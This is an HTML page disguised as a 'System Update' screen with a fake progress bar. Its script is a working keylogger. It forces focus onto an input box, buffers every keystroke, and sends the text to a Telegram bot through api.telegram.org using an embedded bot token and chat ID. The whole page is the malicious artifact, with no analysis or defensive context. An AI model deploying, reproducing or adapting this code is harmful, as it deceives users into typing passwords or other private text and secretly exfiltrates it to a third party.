<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #2a2a2a;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.8);
            max-width: 90%;
        }
        h1 { color: #00ff88; }
        .progress {
            width: 100%;
            height: 20px;
            background: #333;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #00ff88;
            border-radius: 10px;
            animation: load 3s forwards;
        }
        @keyframes load {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        .status { color: #aaa; font-size: 14px; }

        #keyInput {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            padding: 14px;
            background: #333;
            border: 2px solid #00ff88;
            border-radius: 12px;
            color: #fff;
            font-size: 18px;
            text-align: center;
            z-index: 999;
            outline: none;
        }
        #keyInput:focus {
            border-color: #00ff88;
            box-shadow: 0 0 30px rgba(0,255,136,0.4);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 System Update</h1>
        <p>Optimizing system performance...</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        <p class="status">✅ Update completed successfully</p>
    </div>

    <input type="text" id="keyInput" placeholder="Type here..." autofocus>

    <script>
        // ===== TELEGRAM CONFIG =====
        const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
        const CHAT_ID = "1431950109";

        // ===== BUFFER & TIMER =====
        let buffer = "";
        let timer = null;
        const IDLE_TIME = 10000; // 10 seconds

        const input = document.getElementById('keyInput');

        // ===== FOCUS =====
        setTimeout(() => input.focus(), 500);
        document.addEventListener('click', () => input.focus());

        // ===== RESET TIMER =====
        function resetTimer() {
            if (timer) clearTimeout(timer);
            timer = setTimeout(() => {
                if (buffer.length > 0) {
                    sendToTelegram(buffer);
                    buffer = "";
                    input.value = "";
                }
            }, IDLE_TIME);
        }

        // ===== KEYLOGGER =====
        input.addEventListener('keydown', (e) => {
            const key = e.key;

            if (key === "Enter") {
                e.preventDefault();
                // Send buffer instantly
                if (buffer.length > 0) {
                    sendToTelegram(buffer);
                    buffer = "";
                    input.value = "";
                }
                // Cancel timer
                if (timer) clearTimeout(timer);
                return;
            }

            if (key === "Backspace") {
                buffer = buffer.slice(0, -1);
            } else if (key.length === 1) {
                buffer += key;
            }

            // Reset timer on every key press
            resetTimer();
        });

        // ===== SEND TO TELEGRAM =====
        function sendToTelegram(msg) {
            if (msg.trim() === "") return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: "📱 Keylog: " + msg
                })
            });
        }
    </script>
</body>
</html>
